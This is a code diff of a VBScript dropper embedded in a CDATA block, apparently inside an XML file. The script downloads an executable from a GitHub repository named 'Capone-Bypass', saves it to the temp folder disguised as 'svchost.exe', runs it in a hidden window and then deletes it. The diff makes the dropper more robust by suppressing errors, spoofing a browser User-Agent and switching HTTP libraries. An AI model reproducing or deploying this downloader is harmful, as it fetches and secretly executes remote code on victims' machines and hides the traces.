@@ -11,7 +11,6 @@
         <![CDATA[
             Set objShell = CreateObject("WScript.Shell")
             Set objFSO = CreateObject("Scripting.FileSystemObject")
-            Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
             
             ' Download URL
             strURL = "https://raw.githubusercontent.com/sircapone1306-wq/Capone-Bypass/main/LilithClicker.exe"
@@ -19,27 +18,35 @@
             ' Temp file path
             strTemp = objShell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
             
-            ' Download file
+            On Error Resume Next
+            
+            ' Use WinHTTP instead of MSXML2
+            Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
             objHTTP.Open "GET", strURL, False
+            objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
             objHTTP.Send
             
             If objHTTP.Status = 200 Then
+                ' Write binary data directly
                 Set objStream = CreateObject("ADODB.Stream")
+                objStream.Mode = 3
                 objStream.Type = 1
                 objStream.Open
                 objStream.Write objHTTP.ResponseBody
+                objStream.Position = 0
                 objStream.SaveToFile strTemp, 2
                 objStream.Close
-                Set objStream = Nothing
                 
                 ' Execute
-                objShell.Run strTemp, 0, False
+                objShell.Run """" & strTemp & """", 0, False
                 
-                ' Self-destruct after 5 seconds
-                WScript.Sleep 5000
+                ' Cleanup after delay
+                WScript.Sleep 3000
+                On Error Resume Next
                 objFSO.DeleteFile strTemp, True
             End If
             
+            Set objStream = Nothing
             Set objHTTP = Nothing
             Set objFSO = Nothing
             Set objShell = Nothing
